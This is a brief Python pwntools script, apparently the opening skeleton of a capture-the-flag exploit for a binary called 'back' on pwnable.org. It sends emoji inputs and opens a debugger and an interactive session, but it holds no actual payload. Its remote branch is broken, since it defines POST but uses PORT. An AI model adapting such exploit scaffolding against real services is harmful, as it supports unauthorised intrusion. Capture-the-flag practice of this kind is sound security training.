#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

HOST = 'pwnable.org'
POST = 31323
LIBC = ELF("./libc-2.27.so")
if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./back',env = {"LD_PRELOAD" : "./libc-2.27.so"})

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

if __name__=="__main__":
    sla(' 🐮🍺\n','🍺')
    sla('🐮🍺\n','🐴')
    gdb.attach(io)
    sl('😁'*20)
    io.interactive()
